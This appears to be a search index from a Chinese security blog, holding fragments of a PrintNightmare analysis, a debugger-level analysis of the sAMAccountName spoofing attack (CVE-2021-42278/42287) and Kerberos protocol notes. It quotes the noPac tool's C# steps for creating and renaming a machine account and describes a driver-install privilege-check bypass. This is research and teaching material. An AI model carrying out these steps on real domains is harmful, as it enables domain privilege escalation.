漏洞复现及分析","uri":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞点分析"},{"categories":[],"content":"\r漏洞具体分析\r越过权限校验通过YAddPrinterDriverEx添加打印机驱动时，Windows原本会在SplAddPrinterDriverEx中通过ValidateObjectAccess对当前用户权限进行校验，如果权限校验失败将无法加载驱动。但是由于添加了标志APD_INSTALL_WARNED_DRIVER(0x8000)，所以成功越过了对于权限的检查。 YAddPrinterDriverEx本地的内部实现位于localspl.dll中的InternalAddPrinterDriverEx函数，添加驱动的过程如下： 检查驱动签名 建立驱动文件列表 检查驱动兼容性 拷贝驱动文件 如果能够绕过其中的限制，将恶意DLL复制到驱动目录并加载，就可以完成本地提权。 检查驱动签名localspl!ValidateDriverInfo在如下 ","date":"2021-12-31","objectID":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"PrintNightmare 漏洞复现及分析","uri":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞具体分析"},{"categories":[],"content":"\r漏洞具体分析\r越过权限校验通过YAddPrinterDriverEx添加打印机驱动时，Windows原本会在SplAddPrinterDriverEx中通过ValidateObjectAccess对当前用户权限进行校验，如果权限校验失败将无法加载驱动。但是由于添加了标志APD_INSTALL_WARNED_DRIVER(0x8000)，所以成功越过了对于权限的检查。 YAddPrinterDriverEx本地的内部实现位于localspl.dll中的InternalAddPrinterDriverEx函数，添加驱动的过程如下： 检查驱动签名 建立驱动文件列表 检查驱动兼容性 拷贝驱动文件 如果能够绕过其中的限制，将恶意DLL复制到驱动目录并加载，就可以完成本地提权。 检查驱动签名localspl!ValidateDriverInfo在如下 ","date":"2021-12-31","objectID":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"PrintNightmare 漏洞复现及分析","uri":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#越过权限校验"},{"categories":[],"content":"\r漏洞具体分析\r越过权限校验通过YAddPrinterDriverEx添加打印机驱动时，Windows原本会在SplAddPrinterDriverEx中通过ValidateObjectAccess对当前用户权限进行校验，如果权限校验失败将无法加载驱动。但是由于添加了标志APD_INSTALL_WARNED_DRIVER(0x8000)，所以成功越过了对于权限的检查。 YAddPrinterDriverEx本地的内部实现位于localspl.dll中的InternalAddPrinterDriverEx函数，添加驱动的过程如下： 检查驱动签名 建立驱动文件列表 检查驱动兼容性 拷贝驱动文件 如果能够绕过其中的限制，将恶意DLL复制到驱动目录并加载，就可以完成本地提权。 检查驱动签名localspl!ValidateDriverInfo在如下 ","date":"2021-12-31","objectID":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"PrintNightmare 漏洞复现及分析","uri":"/2021/12/printnightmare-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#检查驱动签名"},{"categories":[],"content":"\r背景漏洞编号为：CVE-2021-42278 和 CVE-2021-42287 CVE-2021-42278：通常情况下，机器账户应以$结尾，即DC$。 但是AD域并没有对其进行强校验。通过建立与域控同名却不以$结尾的机器账户，即DC，对域控进行欺骗。 MSRC CVE-2021-42278 KB5008102 CVE-2021-42278 CVE-2021-42287：利用上述漏洞进行欺骗，请求到DC的TGT后，修改自身的机器账号。之后，利用Kerberos的S4U2Self机制，请求对于“自己”（DC）的ST，但是由于此时机器名已经被修改而无法找到DC，域控将会用DC$的Key进行加密，并向其中添加请求的账户名的PAC。至此便得到了高权限ST。 MSRC CVE-2021-42287 KB5008102 CVE-2021-42287 ","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:1:0","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#背景"},{"categories":[],"content":"\r环境配置域控：Windows Server 2003 Debug版 攻击机：Windows 7 x64 SP1 武器化工具：https://github.com/cube0x0/noPac ","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:2:0","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#环境配置"},{"categories":[],"content":"\r详细分析","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:3:0","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#详细分析"},{"categories":[],"content":"\rActive Directory 目录树使用SysinternalsSuite中的ADExplorer64工具查看域内的所有机器账户 上图显示了Active Directory中的完整目录树，其中需要注意的是Computers和Domain Controllers这两项在目录树中的相对位置，正是由于Computer在前，在遍历目录树时才会先获得新建的DC同名账户。 从上图中可以很明确的看到域控的机器名为WINSRVSERVER$，之后会使用WINSRVSERVER作为机器账户名进行欺骗。 ","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:3:1","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#active-directory-目录树"},{"categories":[],"content":"\r攻击准备工作相关准备工作不是本文重点，可以在noPac项目中学习 c# //new machine account NewMachineAccount(argContainer, argDistinguishedName, argDomain, argDomainController, argMachineAccount, argMachinePassword, argVerbose, argRandom, credential); //clean spn SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, \"serviceprincipalname\", argMachineAccount, \"\", false, true, argVerbose, credential); //set samaccountname SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, \"samaccountname\", argMachineAccount, argDomainController.Split('.')[0], false, false, argVerbose, credential);\r","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:3:2","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#攻击准备工作"},{"categories":[],"content":"\r申请TGT申请TGT时是根据修改后的机器账号WINSRVSERVER进行申请的。 域控调用I_GetASTicket处理AS_REQ消息 首先会调用KdcNormalize获得账户的相关信息包括UserInfo、ClientTicketInfo等 ！！！请谨记这个函数，之后的漏洞利用过程会展开分析！！！ cpp KerbErr = KdcNormalize( ClientName, NULL, RequestRealm, NULL, // no source ticket NameFlags | KDC_NAME_CLIENT | KDC_NAME_FOLLOW_REFERRALS | KDC_NAME_CHECK_GC, FALSE, // do not restrict user accounts (user2user) \u0026ClientReferral, ClientRealm, \u0026ClientTicketInfo, pExtendedError, \u0026UserHandle, WhichFields, 0L, \u0026UserInfo, \u0026GroupMembership );\r通过上面获得的ClientTicketInfo调用BuildTicketAS生成TGT，堆栈如下 text kd\u003e kc # 00 KDCSVC!BuildTicketAS 01 KDCSVC!I_GetASTicket 02 KDCSVC!KdcGetTicket 03 KDCSVC!KdcAtqIoCompletion 04 NTDSATQ!ATQ_CONTEXT::IOCompletion 05 NTDSATQ!AtqpProcessContext 06 NTDSATQ!AtqPoolThread 07 kernel32!BaseThreadStart\r查看参数ClientTicketInfo和ClientName可以看到此次是以WINSRVSERVER的身份去申请TGT。 text kd\u003e dt ClientTicketInfo Local var @ 0x332fa00 Type _KDC_TICKET_INFO* 0x0332fcb4 +0x000 AccountName : _UNICODE_STRING \"WINSRVSERVER\" +0x008 TrustedForest : _UNICODE_STRING \"\" +0x010 PasswordExpires : _LARGE_INTEGER 0x7fffffff`ffffffff +0x018 fTicketOpts : 0x7b +0x01c UserAccountControl : 0x80 +0x020 UserId : 0x472 +0x024 TrustType : 0 +0x028 TrustAttributes : 0 +0x02c Passwords : 0x0015eab8 _KERB_STORED_CREDENTIAL +0x030 OldPasswords : 0x001522d0 _KERB_STORED_CREDENTIAL +0x034 TrustSid : (null) +0x038 PasswordVersion : 1 +0x03c LockoutThreshold : 0 kd\u003e dt ClientName Local var @ 0x332fa04 Type KERB_PRINCIPAL_NAME* 0x00084c44 +0x000 name_type : 0n1 +0x004 name_string : 0x000c3360 KERB_PRINCIPAL_NAME_name_string_s kd\u003e dx -id 0,0,89c47a68 -r1 ((KDCSVC!KERB_PRINCIPAL_NAME_name_string_s *)0xc3360) ((KDCSVC!KERB_PRINCIPAL_NAME_name_string_s *)0xc3360) : 0xc3360 [Type: KERB_PRINCIPAL_NAME_name_string_s *] [+0x000] next : 0x0 [Type: KERB_PRINCIPAL_NAME_name_string_s *] [+0x004] value : 0xb45d8 : \"WINSRVSERVER\" [Type: char *]\r上述函数工作完成后，查看生成的Ticket，即TGT text kd\u003e dt KERB_ENCRYPTED_TICKET 0x332fabc KDCSVC!KERB_ENCRYPTED_TICKET +0x000 bit_mask : 0xc0 +0x000 o : [1] \"???\" +0x004 flags : tagASN1bitstring_t +0x00c key : KERB_ENCRYPTION_KEY +0x018 client_realm : 0x000c5098 \"RENPENGYU03.COM\" +0x01c client_name : KERB_PRINCIPAL_NAME +0x024 transited : KERB_TRANSITED_ENCODING +0x030 authtime : tagASN1generalizedtime_t +0x03e starttime : tagASN1generalizedtime_t +0x04c endtime : tagASN1generalizedtime_t +0x05a renew_until : tagASN1generalizedtime_t +0x068 client_addresses : (null) +0x06c authorization_data : (null) 此时还没有向其中添加PAC，会通过之前获得的UserInfo调用KdcGetPacAuthData生成所需的PAC 此时的PAC为WINSRVSERVER的PAC，属于正常流程 text kd\u003e dt AuthorizationData Local var @ 0x332f9d0 Type PKERB_AUTHORIZATION_DATA_s +0x000 next : (null) +0x004 value : PKERB_AUTHORIZATION_DATA_Seq kd\u003e dx -id 0,0,89c47a68 -r1 (*((KDCSVC!PKERB_AUTHORIZATION_DATA_Seq *)0x332f9d4)) (*((KDCSVC!PKERB_AUTHORIZATION_DATA_Seq *)0x332f9d4)) [Type: PKERB_AUTHORIZATION_DATA_Seq] [+0x000] auth_data_type : 128 [Type: long] [+0x004] auth_data [Type: tagASN1octetstring_t] kd\u003e dx -id 0,0,89c47a68 -r1 (*((KDCSVC!tagASN1octetstring_t *)0x332f9d8)) (*((KDCSVC!tagASN1octetstring_t *)0x332f9d8)) [Type: tagASN1octetstring_t] [+0x000] length : 0x260 [Type: unsigned long] [+0x004] value : 0x16c828 : 0x4 [Type: unsigned char *] kd\u003e db 0x16c828 l 260 0016c828 04 00 00 00 00 00 00 00-01 00 00 00 c0 01 00 00 ................ 0016c838 48 00 00 00 00 00 00 00-0a 00 00 00 22 00 00 00 H...........\"... 0016c848 08 02 00 00 00 00 00 00-06 00 00 00 14 00 00 00 ................ 0016c858 30 02 00 00 00 00 00 00-07 00 00 00 14 00 00 00 0............... 0016c868 48 02 00 00 00 00 00 00-01 10 08 00 cc cc cc cc H............... 0016c878 b0 01 00 00 00 00 00 00-00 00 02 00 c2 dd c3 d9 ................ 0016c888 0f f7 d7 01 ff ff ff ff-ff ff ff 7f ff ff ff ff ................ 0016c898 ff ff ff 7f 56 b9 d8 d7-0f f7 d7 01 56 79 42 02 ....V.......VyB. 0016c8a8 d9 f7 d7 01 ff ff ff ff-ff ff ff 7f 18 00 18 00 ................ 0016c8b8 04 00 02 00 00 00 00 00-08 00 02 00 00 00 00 00 ................ 0016c8c8 0c 00 02 00","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#申请tgt"},{"categories":[],"content":"\r还原机器账户名还原机器账户名的目的是使得域控处理TGS_REQ请求的时候，找不到账户从而是用自己的Key加密 c# //undo samaccountname change SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, \"samaccountname\", argMachineAccount, argMachineAccount, false, false, argVerbose, credential);\r","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:3:4","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#还原机器账户名"},{"categories":[],"content":"\r申请STClient向域控申请WINSRVSERVER的服务票据，域控在HandleTGSRequest函数中处理TGS_REQ请求。 首先通过KerbFindPreAuthDataEntry获取TGS_REQ中包含的ApRequest cpp ApRequest = KerbFindPreAuthDataEntry( KRB5_PADATA_TGS_REQ, RequestMessage-\u003eKERB_KDC_REQUEST_preauth_data );\r之后便是解析获得的APRequest获得解密后的TGT cpp //验证请求。这包括对AP请求进行解码，找到合适的密钥来解密票据，并检查票据。 KerbErr = KdcVerifyKdcRequest( ApRequest-\u003epreauth_data.value, ApRequest-\u003epreauth_data.length, ClientAddress, TRUE, // this is a kdc request \u0026UnmarshalledApRequest, \u0026UnmarshalledAuthenticator, \u0026SourceEncryptPart, \u0026ReplyKey, \u0026SourceTicketKey, \u0026ServerTicketInfo, \u0026UseSubKey, pExtendedError );\rKdcVerifyKdcRequest做了以下几件事情 KdcVerifyKdcRequest 解包ApRequest —- KerbUnpackApRequest 根据其中的服务名（kbrtgt）获取服务的相关信息 —- KdcNormalize 通过相关信息找到服务的Hash —- KerbGetKeyFromList 解密TGT — KerbCheckTicket 获得解密后的TGT — KerbVerifyTicket 用TGT中的Key（key为Client与KDC通信所需要的LogonSessionKey）解密获得Authenticator — KerbUnpackAuthenticator ……（校验检查之类的） 查看这个函数的结果，获得了传过来的明文TGT和krbtgt的相关服务信息 text kd\u003e dt ServerTicketInfo Local var @ 0x327fc48 Type _KDC_TICKET_INFO +0x000 AccountName : _UNICODE_STRING \"krbtgt\" +0x008 TrustedForest : _UNICODE_STRING \"\" +0x010 PasswordExpires : _LARGE_INTEGER 0x7fffffff`ffffffff +0x018 fTicketOpts : 0x7b +0x01c UserAccountControl : 0x11 +0x020 UserId : 0x1f6 +0x024 TrustType : 0 +0x028 TrustAttributes : 0 +0x02c Passwords : 0x00084bf0 _KERB_STORED_CREDENTIAL +0x030 OldPasswords : 0x000c4010 _KERB_STORED_CREDENTIAL +0x034 TrustSid : (null) +0x038 PasswordVersion : 2 +0x03c LockoutThreshold : 0 kd\u003e dt SourceEncryptPart Local var @ 0x327fdd0 Type KERB_ENCRYPTED_TICKET* 0x000fcf90 +0x000 bit_mask : 0xd0 +0x000 o : [1] \"???\" +0x004 flags : tagASN1bitstring_t +0x00c key : KERB_ENCRYPTION_KEY +0x018 client_realm : 0x00106a18 \"RENPENGYU03.COM\" +0x01c client_name : KERB_PRINCIPAL_NAME +0x024 transited : KERB_TRANSITED_ENCODING +0x030 authtime : tagASN1generalizedtime_t +0x03e starttime : tagASN1generalizedtime_t +0x04c endtime : tagASN1generalizedtime_t +0x05a renew_until : tagASN1generalizedtime_t +0x068 client_addresses : (null) +0x06c authorization_data : 0x000c3370 PKERB_AUTHORIZATION_DATA_s kd\u003e db authorization_data l 276 0017f168 30 82 02 72 30 82 02 6e-a0 04 02 02 00 80 a1 82 0..r0..n........ 0017f178 02 64 04 82 02 60 04 00-00 00 00 00 00 00 01 00 .d...`.......... 0017f188 00 00 c0 01 00 00 48 00-00 00 00 00 00 00 0a 00 ......H......... 0017f198 00 00 22 00 00 00 08 02-00 00 00 00 00 00 06 00 ..\"............. 0017f1a8 00 00 14 00 00 00 30 02-00 00 00 00 00 00 07 00 ......0......... 0017f1b8 00 00 14 00 00 00 48 02-00 00 00 00 00 00 01 10 ......H......... 0017f1c8 08 00 cc cc cc cc b0 01-00 00 00 00 00 00 00 00 ................ 0017f1d8 02 00 02 4e 81 c8 1c f7-d7 01 ff ff ff ff ff ff ...N............ 0017f1e8 ff 7f ff ff ff ff ff ff-ff 7f 56 b9 d8 d7 0f f7 ..........V..... 0017f1f8 d7 01 56 79 42 02 d9 f7-d7 01 ff ff ff ff ff ff ..VyB........... 0017f208 ff 7f 18 00 18 00 04 00-02 00 00 00 00 00 08 00 ................ 0017f218 02 00 00 00 00 00 0c 00-02 00 00 00 00 00 10 00 ................ 0017f228 02 00 00 00 00 00 14 00-02 00 00 00 00 00 18 00 ................ 0017f238 02 00 08 00 00 00 72 04-00 00 03 02 00 00 01 00 ......r......... 0017f248 00 00 1c 00 02 00 20 00-00 00 00 00 00 00 00 00 ...... ......... 0017f258 00 00 00 00 00 00 00 00-00 00 18 00 1a 00 20 00 .............. . 0017f268 02 00 16 00 18 00 24 00-02 00 28 00 02 00 00 00 ......$...(..... 0017f278 00 00 00 00 00 00 80 00-00 00 00 00 00 00 00 00 ................ 0017f288 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0017f298 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0017f2a8 00 00 00 00 00 00 00 00-00 00 0c 00 00 00 00 00 ................ 0017f2b8 00 00 0c 00 00 00 57 00-49 00 4e 00 53 00 52 00 ......W.I.N.S.R. 0017f2c8 56 00 53 00 45 00 52 00-56 00 45 00 52 00 00 00 V.S.E.R.V.E.R... 0017f2d8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0017f2e8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0017f2f8 00 00 00 00 0","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:3:5","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#申请st"},{"categories":[],"content":"\r总结本文介绍了CVE-2021-42278和CVE-2021-42287的漏洞背景,并从系统层面详细分析了漏洞成因，其关键点在于S4U2self过程中的欺骗。 对于任何技术的研究，都不要靠想当然。用苍白的文字来理解协议，远不如用可靠的代码和调试信息。 ","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:4:0","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#总结"},{"categories":[],"content":"\r参考https://www.rfc-editor.org/rfc/rfc4120.txt https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aceb70de-40f0-4409-87fa-df00ca145f5a https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/ae60c948-fda8-45c2-b1d1-a71b484dd1f7 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/c38cc307-f3e6-4ed4-8c81-dc550d96223c ","date":"2021-12-30","objectID":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/:5:0","series":[],"tags":[],"title":"sAMAccountName spoofing 完整分析","uri":"/2021/12/samaccountname-spoofing-%E5%AE%8C%E6%95%B4%E5%88%86%E6%9E%90/#参考"},{"categories":[],"content":"\r基本知识","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#基本知识"},{"categories":[],"content":"\rKerberos基本概念Kerberos是一种第三方认证协议，通过使用对称加密技术为客户端/服务器应用程序提供强身份验证。在希腊神话中Kerberos是守护地狱之门的一条三头神犬，而这三个头分别代表着协议的三个角色，如下图所示它们分别是： 访问服务的Client 提供服务的Server KDC，密钥分发中心，该中心里又包含以下两个服务： AS，身份验证服务 TGS，票据授权服务 在Windows域中通常由DC扮演其中的KDC进行所有票据的发放。DC中会默认创建一个Krbtgt账户，对应着Kerberos的认证服务。 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:1","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#kerberos基本概念"},{"categories":[],"content":"\rKerberos基本流程Kerberos认证主要通过三个子协议来完成，它们分别为： Authentication Service Exchange，身份认证服务交换，是Client与AS之间交互，包含KRB_AS_REQ和KRB_AS_REP两个包。 Ticket-Granting Service (TGS) Exchange，票据授权服务交换，是Client与TGS之间交互，包含KRB_TGS_REQ和KRB_TGS_REP两个包。 Client/Server Authentication Exchange，客户端/服务认证交换，是Client与Server之间交互，包含KRB_AP_REQ和KRB_AP_REP两个包。 具体流程如下图所示： AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳 AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。 TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求 TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据) AP_REQ: Client拿着TGS票据去请求服务 AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:2","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#kerberos基本流程"},{"categories":[],"content":"\rKerberos委派委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B“代理”自己去访问C服务，说是代理，也可以理解为“假冒”。 具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。 委派存在三种形式： 非约束委派 约束委派 基于资源的约束委派 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:3","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#kerberos委派"},{"categories":[],"content":"\r调试分析基本流程DC：Windows Server 2003 调试版 IP：192.168.45.10 Client1：Windows Server 2003 调试版 IP：192.168.45.11 Client2：Windows 7 IP：192.168.45.15 以下调试信息并非全部在同一次认证过程中截取 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#调试分析基本流程"},{"categories":[],"content":"\rAS_REQ当Clinet1用密码进行交互登陆时，其会向AS（由域控扮演）发送AS_REQ AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳，请求TGT票据 调用堆栈如下： 其中的Logon Session中存在当前账户的NTLMHash，之后便是用这个Hash去加密时间戳 对KDC请求的服务名称为krbtgt 之后会在KerbBuildPreAuthData中生成PreAuthData的认证消息，其中便包括使用用户Hash加密的时间戳 cpp KerbErr = KerbEncryptDataEx( \u0026EncryptedData, EncryptedTimeSize, EncryptedTime, KERB_NO_KEY_VERSION, KERB_ENC_TIMESTAMP_SALT, UserKey );\r该函数实现了加密过程，其中 EncryptedTime为打包后的时间戳 UserKey为用户Hash EncryptedData.cipher_text为加密后的数据 图中标记分别为用户Hash和加密后的时间戳 最后便是将认证包打包发送 通过Wireshark抓包查看padata与分析一致 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:1","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#as_req"},{"categories":[],"content":"\rAS_REPAS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。 KDC会在KdcCheckPreAuthData函数中对所接收到的数据包进行检查。在 KdcVerifyEncryptedTimeStamp中使用用户Hash对PreAuthData进行解密，查看是否正确，时间偏差是否在信任范围内 cpp KerbErr = KdcVerifyEncryptedTimeStamp( ListElement, ClientTicketInfo, RequestBody, UserHandle, \u0026OutputElement, UsedOldPassword );\r之后会通过PacOptions确定是否需要建立PAC 通过BuildTicketAS函数生成返回的AS_REP内容， 其中的encrypted_part. cipher_text为TGT，此时还未加密可以导出明文 其中key为Client与KDC通信所需要的Logon Session Key authorization_data为PAC，会在下一步生成并填入其中 之后会根据之前保存的标志确定是否构建PAC，会在KdcGetPacAuthData中构建PAC并对其进行签名后加入到上方TGT中的authorization_data中 其实质上应该是_KERB_VALIDATION_INFO结构体，其中包括了登陆用户的一些信息。 cpp typedef struct _KERB_VALIDATION_INFO { FILETIME LogonTime; FILETIME LogoffTime; FILETIME KickOffTime; FILETIME PasswordLastSet; FILETIME PasswordCanChange; FILETIME PasswordMustChange; RPC_UNICODE_STRING EffectiveName; RPC_UNICODE_STRING FullName; RPC_UNICODE_STRING LogonScript; RPC_UNICODE_STRING ProfilePath; RPC_UNICODE_STRING HomeDirectory; RPC_UNICODE_STRING HomeDirectoryDrive; USHORT LogonCount; USHORT BadPasswordCount; ULONG UserId; ULONG PrimaryGroupId; ULONG GroupCount; [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds; ULONG UserFlags; USER_SESSION_KEY UserSessionKey; RPC_UNICODE_STRING LogonServer; RPC_UNICODE_STRING LogonDomainName; PISID LogonDomainId; ULONG Reserved1[2]; ULONG UserAccountControl; ULONG SubAuthStatus; FILETIME LastSuccessfulILogon; FILETIME LastFailedILogon; ULONG FailedILogonCount; ULONG Reserved3; ULONG SidCount; [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids; PISID ResourceGroupDomainSid; ULONG ResourceGroupCount; [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds; } KERB_VALIDATION_INFO;\r创建Reply消息，ReplyBody中包含最重要的就是Logon Session Key,该结构会使用Client Hash加密；明文TGT使用krbtgt hash进行加密 加密后的ReplyBody 加密后的TGT ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:2","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#as_rep"},{"categories":[],"content":"\rTGS_REQTGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求 AP_REQ: Client拿着TGS票据去请求服务 Windows将这两步融合在了一起，具体信息可以Wireshark抓包查看 Client会在KerbMakeKdcCall中接收到KDC返回的AS_REP消息 解包后内容，其中ticket就是加密后的TGT，encrypted_part为加密后的ReplyBody 使用ClientKey对ReplyBody进行解密，获得Logon Session Key TGT由于是被Krbtgt hash加密的，并不能解密获得明文，而是使用它来认证自身的身份。其会被保存在本地，通过KerbCreateTicketCacheEntry建立一个新的TicketCacheEntry进行保存 至此认证过程完全完成，下一步将向KDC请求ST（Service Ticket） 为了体现更加通用的场景，以下的Kerberos认证过程触发方式不再是用户登陆 Client1向KDC请求某一个共享文件夹的访问权限 命令：dir \\\\KDCComputerName\\C$ Client会在KerbGetServiceTicket中向KDC发起申请ST的TGS请求 首先会通过KerbGetTgtForService进行身份认证，即上述两次通信过程，获得的TGT储存在第7参数TicketGrantingTicket中 之后使用KerbGetTgsTicket这个函数，通过TGT申请TGS 创建RequestBody，其中主要信息为我们所申请的服务名称 由于我们要证明自己确实是向KDC申请TGT的机器，所以必须将该结构使用只有KDC与自己两个人知道的Key进行签名，即是用Logon Session Key进行签名 所以便会调用KerbComputeTgsChecksum进行签名 Windows上的TgsRequest的TGT和身份认证部分都由Aprequest结果保存 通过KerbCreateApRequest创建ApRequest 通过KerbCreateAuthenticator创建Authenticator 将上面的checksum放入该结构体中，之后使用Logon Session Key进行加密 至此ApRequest创建完成，其中包含 Krbtgt Hash 加密的TGT Logon Session 加密的 Authenticator 最后在kerberos!KerbMakeSocketCall中发送 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:3","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#tgs_req"},{"categories":[],"content":"\rTGS_REPTGS_REP: KDC使用krbtgt 